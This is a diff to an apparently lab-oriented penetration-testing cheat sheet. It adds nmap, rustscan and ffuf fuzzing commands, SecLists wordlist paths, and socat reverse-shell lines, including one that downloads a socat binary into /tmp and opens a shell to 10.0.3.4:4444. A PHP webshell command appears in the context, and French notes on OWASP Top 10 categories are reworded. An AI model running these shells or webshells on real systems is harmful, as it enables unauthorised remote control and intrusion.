@@ -6,15 +6,18 @@
 | Description        | Command      |
 | ------ | ----- |
 | Show our IP address | ``ifconfig/ip a`` |
-| Run nmap on an IP | `` nmap 10.129.42.253 `` |
-| Run an nmap script scan on an IP | `` nmap -sV -sC -p- 10.129.42.253 `` |
-| List various available nmap scripts | `` locate scripts/citrix	  `` |
+| Run nmap on an IP | `` nmap 10.10.10.40 `` |
+| Run an nmap script scan on an IP | `` nmap -sV -sC -p- 10.10.10.40 `` |
+| Run an nmap script scan for upd with Os detection | `` nmap -sUV -T4 10.10.10.40 `` |
+| Run a faster nmap script scan for upd |  `` nmap -sUV -T4 -F --version-intensity 0 10.10.10.40 `` |
+| List various available nmap scripts | `` locate scripts/citrix `` |
 | Run an nmap script on an IP | `` nmap --script smb-os-discovery.nse -p445 10.10.10.40 `` |
-| Grab banner of an open port | `` netcat 10.10.10.10 22 `` |
-| List SMB Shares | `` smbclient -N -L \\\\10.129.42.253 `` |
-| Connect to an SMB share | `` smbclient \\\\10.129.42.253\\users `` |
-| Scan SNMP on an IP | `` snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0 `` |
-| Brute force SNMP secret string | `` onesixtyone -c dict.txt 10.129.42.254 `` |
+| Grab banner of an open port | `` netcat 10.10.10.40 22 `` |
+| List SMB Shares | `` smbclient -N -L \\\\10.10.10.40 `` |
+| Connect to an SMB share | `` smbclient \\\\10.10.10.40\\users `` |
+| Scan SNMP on an IP | `` snmpwalk -v 2c -c public 10.10.10.40 1.3.6.1.2.1.1.5.0 `` |
+| Brute force SNMP secret string | `` onesixtyone -c dict.txt 10.10.10.40 `` |
+| Scan number of open ports | `` rustscan -a 10.10.10.10 -u 3000 `` |
 
 ### Web Enumeration
 | Description        | Command      |
@@ -24,6 +27,27 @@
 | Grab website banner | `` curl -IL https://www.example.com `` |
 | List details about the webserver/certificates | `` whatweb 10.10.10.121 `` |
 | List potential directories in robots.txt | `` curl 10.10.10.121/robots.txt `` |
+
+### Fuzzing
+| Description        | Command      |
+| ------ | ----- |
+| Directory Fuzzing with ffuf | `` ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ `` |
+| Extension Fuzzing with ffuf | `` ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ `` |
+| Page Fuzzing with ffuf | `` ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php `` |
+| Recursive Fuzzing with ffuf | `` ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v `` |
+| Subdomain Fuzzing with ffuf | `` ffuf -w wordlist.txt:FUZZ -u https://FUZZ.example.com `` |
+| VHost Fuzzing with ffuf | `` ffuf -w wordlist.txt:FUZZ -u http://example.com:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx `` |
+| Get parameter Fuzzing with ffuf | `` ffuf -w wordlist.txt:FUZZ -u http://example.com:PORT/admin/admin.php?FUZZ=key -fs xxx `` |
+| Post parameter Fuzzing with ffuf | `` ffuf -w wordlist.txt:FUZZ -u http://example.com:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx `` |
+| Value Fuzzing with ffuf | ``ffuf -w ids.txt:FUZZ -u http://example.com:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx `` |
+
+### Wordlists
+| Description        | Command      |
+| ------ | ----- |
+| Directory and page wordlist | `` /secLists/Discovery/Web-Content/directory-list-2.3-small.txt `` |
+| Extension wordlist | `` /secLists/Discovery/Web-Content/web-extensions.txt `` || Directory and page wordlist | `` secLists/Discovery/Web-Content/directory-list-2.3-small.txt `` |
+| Domain wordlist | `` secLists/Discovery/DNS/subdomains-top1million-5000.txt `` |
+| Parameters wordlist | `` secLists/Discovery/Web-Content/burp-parameter-names.txt `` |
 
 ### Public exploit
 | Description        | Command      |
@@ -51,6 +75,9 @@
 | Upgrade shell TTY (2) | `` ctrl+z then stty raw -echo then fg then enter twice `` |
 | Create a webshell php file | `` echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php `` |
 | Execute a command on an uploaded webshell | `` curl http://SERVER_IP:PORT/shell.php?cmd=id `` |
+| Start socat listener  | `` socat file:`tty`,raw,echo=0 tcp-listen:4444 `` |
+| Start a socat reverse shell on remote server | `` socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444 `` |
+| Download the corrrect socat architecture and exec reserse shell |  `` wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444 `` |
 
 ### Privilege Escalation
 | Description        | Command      |
@@ -150,21 +177,20 @@ Protéger de manière inappropriée les données telles que les informations fin
 **- XML External Entities:**
 Processeurs XML mal configurés pouvant entraîner la divulgation de fichiers internes, l'analyse des ports, l'exécution de code à distance ou des attaques par déni de service.
 
-
 **- Broken Access control:**
 Les restrictions ne sont pas mises en œuvre de manière appropriée pour empêcher les utilisateurs d'accéder à d'autres comptes d'utilisateurs, d'afficher des données sensibles, d'accéder à des fonctionnalités non autorisées, de modifier des données, etc.
 
 **- Security misconfiguration:**
-Configurations par défaut non sécurisées, stockage en nuage ouvert, messages d'erreur verbeux qui divulguent trop d'informations.
+Configurations par défaut non sécurisées, stockage en cloud ouvert, messages d'erreur qui divulguent trop d'informations.
 
 **- Cross-site Scripting XSS:**
 XSS se produit lorsqu'une application ne nettoie pas correctement les entrées fournies par l'utilisateur, permettant l'exécution de HTML ou de JavaScript dans le navigateur d'une victime. Cela peut entraîner un piratage de session, une dégradation du site Web, une redirection d'un utilisateur vers un site Web malveillant, etc.
 
 **- Insecure Deserialization:**
-Cette faille conduit souvent à l'exécution de code à distance, à des attaques par injection ou à des attaques par élévation de privilèges.
+Cette faille conduit souvent à de l'exécution de code, à des attaques par injection ou à des attaques par élévation de privilèges.
 
 **- Using component with known vulnerabilities:**
-Tous les composants utilisés par une application (bibliothèques, frameworks, modules logiciels) s'exécutent avec le même privilège que l'application. Si l'application utilise des composants présentant des défauts connus, cela peut entraîner l'exposition de données sensibles ou l'exécution de code à distance.
+Tous les composants utilisés par une application (bibliothèques, frameworks, modules logiciels) s'exécutent avec le même privilège que l'application. Si l'application utilise des composants présentant des défauts connus, cela peut entraîner l'exposition de données sensibles ou une exécution de code à distance.
 
 **- Insufficient Logging & monitoring:**
-Des lacunes dans la journalisation et la surveillance peuvent permettre à une attaque réussie de passer inaperçue, aux attaquants d'établir la persistance dans le réseau, ou de falsifier ou d'extraire des données sensibles sans se faire remarquer.
+Des failles dans la journalisation et la surveillance peuvent permettre à une attaque réussie de passer inaperçue, aux attaquants d'établir une connexion persistante dans le réseau, de falsifier ou d'extraire des données sensibles sans se faire remarquer.
